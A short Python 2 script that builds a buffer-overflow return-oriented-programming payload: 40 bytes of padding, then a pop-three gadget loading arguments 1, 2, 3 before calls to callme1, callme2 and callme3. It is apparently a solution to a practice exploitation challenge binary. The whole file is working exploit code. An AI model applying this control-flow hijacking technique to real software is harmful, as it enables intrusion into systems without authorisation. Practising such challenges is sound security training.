import struct   

def conv(x): 
    return struct.pack('<Q', x) 

pop3ret = conv(0x401ab0) 
callme1 = conv(0x00401850) 
callme2 = conv(0x00401870) 
callme3 = conv(0x00401810) 
  

buf = 'A'*40 
buf += pop3ret  
buf += conv(0x1) 
buf += conv(0x2) 
buf += conv(0x3) 
buf += callme1 
buf += pop3ret 
buf += conv(0x1) 
buf += conv(0x2) 
buf += conv(0x3) 
buf += callme2 
buf += pop3ret  
buf += conv(0x1) 
buf += conv(0x2) 
buf += conv(0x3) 
buf += callme3 
print buf
